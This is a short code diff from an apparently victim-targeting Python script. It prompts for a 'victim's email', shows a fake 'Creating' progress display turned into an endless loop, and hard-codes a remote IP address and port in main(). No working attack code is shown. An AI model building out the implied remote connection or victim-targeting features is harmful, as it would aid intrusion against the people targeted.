@@ -96,8 +96,12 @@ def optional():
         phone_number = input("Enter victim's email : ")
         is_he_care = input("Is he too much careful : ")
         print(f"Wait..... Creating.......Wait {random.randint(10,59)}")
-        for trans_load in tqdm(range(0,100)):
-            time.sleep(.1)
+        li = []
+        while True:
+          time.sleep(2)
+          a = "█"
+          li.append(a)
+          print(li)
 def main():
     ip = "3.22.30.40"
     port = 18207
